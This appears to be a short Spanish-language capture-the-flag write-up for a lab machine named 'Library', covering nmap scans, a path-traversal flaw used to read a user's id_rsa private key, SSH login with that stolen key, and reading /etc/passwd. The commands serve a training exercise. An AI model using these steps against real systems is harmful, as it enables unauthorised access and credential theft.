### Maquina Library


## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2 

![alt text](image-1.png)

## Entrar en la web

![alt text](image-2.png)

haciendo ctrl + u

![alt text](image-3.png)

## LFI

al hacer path traversal, encontramos el usuario

ahora verifico que tambien se puede ver el id_rsa

![alt text](image-4.png)

## Intrusion

entramos por ssh haciendo:

copiamos el id_rsa en un archivo llamado id_rsa y le damos los permisos 600

chmod 600 id_rsa

ssh -i id_rsa nico@172.17.0.2

estamos dentro:

ver todos los usuarios:

cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
nico:x:1000:1000:,,,:/home/nico:/bin/bash

![alt text](image-5.png)



